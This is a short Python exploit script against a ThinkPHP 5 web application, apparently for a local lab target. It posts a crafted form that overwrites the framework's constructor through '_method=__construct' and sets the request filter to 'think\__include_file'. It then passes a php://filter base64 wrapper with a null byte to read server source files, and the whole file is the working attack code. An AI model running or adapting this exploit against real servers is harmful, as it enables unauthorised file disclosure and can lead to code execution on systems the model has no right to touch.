import requests
url = "http://localhost/www/public/index.php"
data = {
    "_method":"__construct",
    "method":"GET",
    "filter[]":"think\__include_file",
    "server[]":"1",
    "get[]":"PHP://filter/read=convert.base64-encode/resource=/var/www/html/www/thinkphp/library/think/console/command/Help.php{}.php".format(chr(0))
}
response=requests.post(url=url,data=data)

print(response.text)